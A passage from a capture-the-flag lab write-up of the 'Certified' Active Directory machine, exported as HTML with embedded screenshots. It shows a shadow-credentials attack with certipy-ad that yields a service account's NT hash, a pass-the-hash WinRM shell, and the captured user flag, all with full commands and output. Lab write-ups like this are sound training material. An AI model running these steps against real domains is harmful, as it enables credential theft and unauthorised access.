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" alt="e4fbf64524ee510bb21444636a143d7a.png"/></p>
+<p>The <code class="inline-code">pywhisker</code> was giving me issues. However, I managed to obtain the NTLM hash of the user <code class="inline-code">management_svc</code>:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Certified]
+&boxur;&boxh;$ certipy-ad shadow auto -u judith.mader@certified.htb -p judith09 -account management_svc -dc-ip 10.129.231.186
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The resolution lifetime expired after 5.403 seconds: Server Do53:10.129.231.186@53 answered The DNS operation timed out.; Server Do53:10.129.231.186@53 answered The DNS operation timed out.; Server Do53:10.129.231.186@53 answered The DNS operation timed out.
+[!] Use -debug to print a stacktrace
+[*] Targeting user &apos;management_svc&apos;
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID &apos;1ccd8fb65e3840458ec5084ebad3c647&apos;
+[*] Adding Key Credential with device ID &apos;1ccd8fb65e3840458ec5084ebad3c647&apos; to the Key Credentials for &apos;management_svc&apos;
+[*] Successfully added Key Credential with device ID &apos;1ccd8fb65e3840458ec5084ebad3c647&apos; to the Key Credentials for &apos;management_svc&apos;
+[*] Authenticating as &apos;management_svc&apos; with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: &apos;management_svc@certified.htb&apos;
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to &apos;management_svc.ccache&apos;
+[*] Wrote credential cache to &apos;management_svc.ccache&apos;
+[*] Trying to retrieve NT hash for &apos;management_svc&apos;
+[*] Restoring the old Key Credentials for &apos;management_svc&apos;
+[*] Successfully restored the old Key Credentials for &apos;management_svc&apos;
+[*] NT hash for &apos;management_svc&apos;: a091c1832bcdd4677c28b5a6a1295584</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Certified]
+&boxur;&boxh;$ certipy-ad shadow auto -u judith.mader@certified.htb -p judith09 -account management_svc -dc-ip 10.129.231.186
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The resolution lifetime expired after 5.403 seconds: Server Do53:10.129.231.186@53 answered The DNS operation timed out.; Server Do53:10.129.231.186@53 answered The DNS operation timed out.; Server Do53:10.129.231.186@53 answered The DNS operation timed out.
+[!] Use -debug to print a stacktrace
+[*] Targeting user &apos;management_svc&apos;
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID &apos;1ccd8fb65e3840458ec5084ebad3c647&apos;
+[*] Adding Key Credential with device ID &apos;1ccd8fb65e3840458ec5084ebad3c647&apos; to the Key Credentials for &apos;management_svc&apos;
+[*] Successfully added Key Credential with device ID &apos;1ccd8fb65e3840458ec5084ebad3c647&apos; to the Key Credentials for &apos;management_svc&apos;
+[*] Authenticating as &apos;management_svc&apos; with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: &apos;management_svc@certified.htb&apos;
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to &apos;management_svc.ccache&apos;
+[*] Wrote credential cache to &apos;management_svc.ccache&apos;
+[*] Trying to retrieve NT hash for &apos;management_svc&apos;
+[*] Restoring the old Key Credentials for &apos;management_svc&apos;
+[*] Successfully restored the old Key Credentials for &apos;management_svc&apos;
+[*] NT hash for &apos;management_svc&apos;: a091c1832bcdd4677c28b5a6a1295584</code></pre></div>
+<p>Now I have a shell on the machine as the user <code class="inline-code">management_svc</code> via WinRM:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Certified]
+&boxur;&boxh;$ evil-winrm -i certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&apos; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\management_svc\Documents&gt; whoami
+certified\management_svc
+*Evil-WinRM* PS C:\Users\management_svc\Documents&gt; ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . : .htb
+   IPv4 Address. . . . . . . . . . . : 10.129.231.186
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Default Gateway . . . . . . . . . : 10.129.0.1
+*Evil-WinRM* PS C:\Users\management_svc\Documents&gt; 
+</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Certified]
+&boxur;&boxh;$ evil-winrm -i certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&apos; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\management_svc\Documents&gt; whoami
+certified\management_svc
+*Evil-WinRM* PS C:\Users\management_svc\Documents&gt; ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . : .htb
+   IPv4 Address. . . . . . . . . . . : 10.129.231.186
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Default Gateway . . . . . . . . . : 10.129.0.1
+*Evil-WinRM* PS C:\Users\management_svc\Documents&gt; 
+</code></pre></div>
+<p>The <code class="inline-code">user.txt</code> flag:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">*Evil-WinRM* PS C:\Users\management_svc&gt; cd Desktop
+*Evil-WinRM* PS C:\Users\management_svc\Desktop&gt; dir
+
+
+    Directory: C:\Users\management_svc\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        2/25/2026   4:56 PM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\management_svc\Desktop&gt; more user.txt
+22702d055fe7a183f7fd44d35cf41153</pre><pre class="hljs"><code>*Evil-WinRM* PS C:\Users\management_svc&gt; <span class="hljs-keyword">cd</span> Desktop
+*Evil-WinRM* PS C:\Users\management_svc\Desktop&gt; dir
+
+
+    Directory: C:\Users\management_svc\Desktop
+
+
+Mode                LastWriteTime         Length Name
+<span class="hljs-params">----</span>                <span class="hljs-params">-------------</span>         <span class="hljs-params">------</span> <span class="hljs-params">----</span>
+-ar<span class="hljs-params">---</span>        2/25/2026   4<span class="hljs-function">:56</span> PM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\management_svc\Desktop&gt; more user.txt
+22702d055fe7a183f7fd44d35cf41153</code></pre></div>
+<p>Now the <code class="inline-code">management_svc</code> has <code class="inline-code">GenericAll</code> privileges over the <code class="inline-code">ca_operator</code>:<br/>
+<img src="data:image/png;base64,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